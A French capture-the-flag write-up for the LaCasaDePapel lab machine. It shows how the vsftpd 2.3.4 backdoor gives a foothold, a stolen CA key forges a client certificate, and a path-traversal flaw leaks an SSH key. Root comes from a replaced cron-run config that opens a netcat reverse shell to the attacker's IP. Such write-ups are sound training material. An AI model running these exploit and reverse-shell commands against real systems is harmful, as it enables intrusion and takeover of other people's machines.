![Pic1](../img/casapapel1.PNG?raw=true) </br>

# Introduction
Lacasadepapel est une machine linux dont l'adresse IP est 10.10.10.131.</br>
Compétences mises en oeuvre :
* Enumération des ports et services d'une machine distante.
* Enumération des fichiers et dossiers d'un site web.
* Recherche et execution d'un exploit.
* Création d'un certificat signé par la box.
* Exploitation d'une LFI
* Elevation de privilège via un fichier exécuté par une tache cron.
</br>

# Enumération initiale
Nous commencons par l'énumération des ports et services de la box avec nmap :
```bash
 $ nmap -T4 -A 10.10.10.131
```
![Pic2](../img/casapapel2.PNG?raw=true) </br>
Plusieurs ports ouverts, nous allons faire une énumération des fichiers et dossiers du site web avec disearch :
```bash
$ dirsearch.py -w wordlist -e 'php,txt' -f -t 100 -x 400,404,403,500 -u http://10.10.10.153/
```
Aucun dossiers/fichiers trouvés.

# Obtenir un accès utilisateur
Le port http nous conduit sur une page avec un QRCode qui servira pour l'authentification. Sur le port 443, nous avons une erreur de certificat, donc il y a peut être un certificat à récupérer quelque part.</br>
Sur le port 21, le service FTP tourne avec un vsftpd en version 2.3.4, c'est une version qui contient des vulnérabilités :
```bash
$ searchsploit vsftpd 2.3
```
![Pic4](../img/casapapel4.PNG?raw=true) </br>
La back a l'air sympa, nous allons l'utiliser :
```bash
$ msfconsole
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf > set RHOST 10.10.10.131
msf > run
```
![Pic5](../img/casapapel5.PNG?raw=true) </br>
Cela ne fonctionne pas comme prévu, l'exploit est bon mais pas de retour, si l'on creuse un petit peu, l'exploit 
essaye de se connecter sur le port 6200 de la machine, nous allons essayer par nous même la manipulation :
```bash
$ telnet 10.10.10.131 6200
```
![Pic6](../img/casapapel6.PNG?raw=true) </br>
Bingo, nous avons un accès, et une variable $tokyo en supplément, regardons de plus près son utilité :
```bash
telnet > show $tokyo
```
![Pic7](../img/casapapel7.PNG?raw=true) </br>
En lisant, la fonction créer un certificat (de l'utilisateur nairobi) signé. Nous avons le chemin du certificat, nous allons essayer de lire le cert de nairobi et l'enregistrer en local en nairobi.ca.key :
```bash
telnet > file_get_contents('/home/nairobi/ca.key');
```
![Pic8](../img/casapapel8.PNG?raw=true) </br>
Maintenant, nous allons prendre la clé sur site web https (je ne montrerai pas les manip) pour créer notre clé client :
```bash
$ openssl genrsa -out client.key 4096
$ openssl req -new -key client.key -out client.csr
$ openssl x509 -req -in client.csr -CA ca.cert -CAkey nairobi.ca.key -set_serial 9001 -extensions client -days 365 -outform PEM -out client.cer
$ openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
```
</br>
Maintenant il nous faut simplement importer dans le navigateur notre client.p12 en certificat et en authorité le ca.cert.</br>
![Pic9](../img/casapapel9.PNG?raw=true) </br>
Nous avons bien accès, la season 1 et 2 nous renvoi juste des videos avi, après investigation, ces videos n'ont rien données.
De retour sur le site, on peut voir que les liens des vidéos sont étranges, après investigation, nous pouvons les décoder :
```bash
$ echo "U0VBU09OLTEvMDEuYXZp" |base64 -d
```
![Pic10](../img/casapapel10.PNG?raw=true) </br>
Nous pouvons alors tenter un chemin basique :</br>
![Pic11](../img/casapapel11.PNG?raw=true) </br>
Parfait, nous pouvons alors avoir la liste des utilisateurs :</br>
![Pic12](../img/casapapel12.PNG?raw=true) </br>
Mais si nous revenons dans le ../, nous pouvons prendre le fichier id_rsa avec de l'encodage base64 :</br>
![Pic13](../img/casapapel13.PNG?raw=true) </br>
Maintenant nous pouvons tester la clé avec différents utilisateurs pour se connecter :
```bash
$ chmod 600 id_rsa
$ ssh professor@10.10.10.131 -i id_rsa
```
![Pic14](../img/casapapel14.PNG?raw=true) </br>
Le user.txt est dans le /home/ de Berlin, nous pouvons le récupérer avec l'encodage base64 comme l'id_rsa :</br>
![Pic15](../img/casapapel15.PNG?raw=true) </br>
![Pic16](../img/casapapel16.PNG?raw=true) </br>

# Obtenir un accès root 
Dans le /home/ du user professor, il y a deux fichier : memcached.ini et memcached.js. Nous pouvons seulement lire le memcached.ini :
```bash
$ cat memcached.ini
```
![Pic17](../img/casapapel17.PNG?raw=true) </br>
Nous ne pouvons pas écrire dedans, mais on peut le supprimer et le remplacer par le notre :
```bash
$ rm memcached.ini
$ echo -e "[program:memecached]\ncommand = sudo -u root /usr/bin/nc 10.10.14.9 4567 -e /bin/bash" > memcached.ini
```
On reçoit une connexion nc et pouvons lire le root.txt :</br>
![Pic18](../img/casapapel18.PNG?raw=true) </br>


